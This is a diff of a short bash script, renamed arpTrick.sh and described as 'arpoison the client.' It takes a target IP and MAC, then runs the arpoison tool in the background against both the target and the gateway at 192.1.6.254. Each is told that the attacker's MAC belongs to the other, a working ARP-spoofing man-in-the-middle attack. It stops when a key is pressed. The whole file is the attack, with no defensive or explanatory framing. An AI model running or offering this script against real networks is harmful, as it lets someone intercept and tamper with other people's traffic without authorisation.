@@ -1,11 +1,11 @@
 #!/bin/bash - 
 #===============================================================================
 #
-#          FILE: trick.sh
+#          FILE: arpTrick.sh
 # 
-#         USAGE: ./trick.sh 
+#         USAGE: ./arpTrick.sh IP MAC
 # 
-#   DESCRIPTION: 
+#   DESCRIPTION: arpoison the client.
 # 
 #       OPTIONS: ---
 #  REQUIREMENTS: ---
@@ -18,12 +18,23 @@
 #===============================================================================
 
 set -o nounset                              # Treat unset variables as an error
+set -x
 
+function usage () {
+    echo "usage: `basename $0` IP_ToPoison MAC_ToPoison"
+}
+if [ "$#" != 2 ] ; then
+    usage; exit 23;
+fi
 
-sudo arpoison -i eth0 -d 192.1.6.101 -s 192.1.6.254 -t 6c:3b:e5:27:d6:ab -r 00:80:48:27:05:0e -w 5  > /dev/null &
-sudo arpoison -i eth0 -d 192.1.6.254 -s 192.1.6.101 -t 3c:e5:a6:d6:1d:61 -r 00:80:48:27:05:0e -w 5 > /dev/null &
+IP=$1;
+MAC=$2;
+ARPOISON=/usr/sbin/arpoison;
 
-echo 'Waiting for a key press...'
+sudo $ARPOISON -i enp0s25 -d $IP -s 192.1.6.254 -t $MAC -r 00:1B:78:EA:62:A9 -w 5  > /dev/null &
+sudo $ARPOISON -i enp0s25 -d 192.1.6.254 -s $IP -t 3C:E5:A6:D6:1D:61 -r 00:1B:78:EA:62:A9 -w 5 > /dev/null &
+
+echo 'Waiting for a key press to cancel...'
 read -n1 -s
 
 sudo pkill arpoison
